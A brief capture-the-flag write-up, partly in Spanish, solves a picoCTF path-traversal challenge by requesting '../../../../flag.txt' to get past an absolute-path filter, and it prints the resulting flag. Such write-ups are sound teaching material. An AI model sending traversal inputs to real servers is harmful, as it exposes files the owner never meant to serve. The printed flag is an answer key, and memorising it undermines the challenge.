Puntos: 200pts
# Objetivo del Nivel

Can you get the flag?Here's the [website](http://saturn.picoctf.net:64403/).
We know that the website files live in `/usr/share/nginx/html/` and the flag is at `/flag.txt` but the website is filtering absolute file paths. 
Can you get past the filter to read the flag?
# Pistas del Nivel
- (none)
# Solución/Resultado/Flag

```bash
se solicita al sitio el archivo  flag.txt

en el path se solicita:
../../../../flag.txt

flag: picoCTF{7h3_p47h_70_5ucc355_e5fe3d4d}

```

picoCTF{7h3_p47h_70_5ucc355_e5fe3d4d}
# Notas Adicionales

Tags:

AUTHOR:
# Referencias

https://play.picoctf.org/practice/challenge/